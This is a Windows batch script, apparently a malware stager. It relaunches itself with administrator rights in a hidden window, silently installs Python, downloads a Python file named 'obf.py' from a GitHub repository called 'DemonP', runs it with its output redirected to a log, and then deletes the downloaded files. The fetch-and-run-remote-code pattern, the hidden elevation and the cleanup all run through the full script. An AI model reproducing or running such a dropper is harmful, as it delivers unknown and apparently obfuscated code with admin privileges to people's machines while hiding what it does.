@echo off
:: Optimized Combined Script - Faster Python Install & Script Execution
:: Silent Admin Install with Auto-Elevation

:: Check if running as administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    PowerShell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs" -WindowStyle Hidden
    exit /b
)

:: =============================================
:: PART 1: FASTER PYTHON INSTALLATION
:: =============================================
:INSTALL_PYTHON
set "pythonURL=https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe"  :: Updated to specific version
set "tempDir=%TEMP%\PythonInstall"
set "installer=python_installer.exe"

:: Create temp dir and download in one step
mkdir "%tempDir%" >nul 2>&1
powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%pythonURL%', '%tempDir%\%installer%')"

if not exist "%tempDir%\%installer%" (
    echo Python download failed
    exit /b 1
)

:: Silent install with progress (no console output)
start /wait "" "%tempDir%\%installer%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 TargetDir="C:\Python" /log "%tempDir%\install.log"

:: Verify installation
where python >nul 2>&1 || (
    echo Python installation failed
    type "%tempDir%\install.log" 2>nul
    exit /b 1
)

:: Update PATH
set PATH=%PATH%;C:\Python;C:\Python\Scripts

:: =============================================
:: PART 2: OPTIMIZED SCRIPT DOWNLOAD & EXECUTION
:: =============================================
:RUN_SCRIPT
set "scriptURL=https://github.com/abidsh540/DemonP/raw/refs/heads/main/obf.py"  :: CHANGE THIS
set "scriptPath=%TEMP%\remote_script.py"

:: Parallel download while Python installs
powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%scriptURL%', '%scriptPath%')"

if not exist "%scriptPath%" (
    echo Script download failed
    exit /b 1
)

:: Execute script with output redirection
python "%scriptPath%" >"%tempDir%\script_output.log" 2>&1

:: Cleanup
del /f /q "%tempDir%\%installer%" >nul 2>&1
del /f /q "%scriptPath%" >nul 2>&1
rmdir /q /s "%tempDir%" >nul 2>&1

exit /b 0